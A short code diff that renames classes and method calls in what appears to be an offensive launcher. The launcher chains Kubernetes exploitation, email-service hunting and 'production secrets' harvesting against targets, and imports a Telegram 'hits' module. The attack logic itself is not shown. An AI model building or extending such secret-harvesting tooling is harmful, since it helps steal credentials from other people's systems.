@@ -19,8 +19,8 @@ from pathlib import Path
 try:
     from wwyv4q_final import WWYVQv5KubernetesOrchestrator, ExploitationConfig, ExploitationMode
     from telegram_perfect_hits import WWYVQv5TelegramFixed
-    from mail_services_hunter import EmailServiceHunter
-    from k8s_production_harvester import ProductionHarvester
+    from mail_services_hunter import MailServicesHunter
+    from k8s_production_harvester import ProductionK8sHarvester
     from k8s_exploit_master import KubernetesExploitMaster
 except ImportError as e:
     print(f"⚠️ Import warning: {e}")
@@ -157,8 +157,8 @@ class IntensiveHuntLauncher:
         self._log("📧 Phase 2: Starting email hunting")
         
         try:
-            hunter = EmailServiceHunter()
-            email_results = await hunter.hunt_email_services(
+            hunter = MailServicesHunter()
+            email_results = await hunter.hunt_mail_services(
                 targets,
                 max_concurrent=self.config['threads'] // 2
             )
@@ -176,8 +176,8 @@ class IntensiveHuntLauncher:
         self._log("🌾 Phase 3: Starting production harvesting")
         
         try:
-            harvester = ProductionHarvester()
-            harvest_results = await harvester.harvest_production_secrets(targets)
+            harvester = ProductionK8sHarvester()
+            harvest_results = await harvester.run_comprehensive_harvest(targets)
             
             self.stats["secrets_extracted"] = len(harvest_results.get("secrets", []))
             self._log(f"✅ Harvesting completed: {self.stats['secrets_extracted']} secrets extracted")
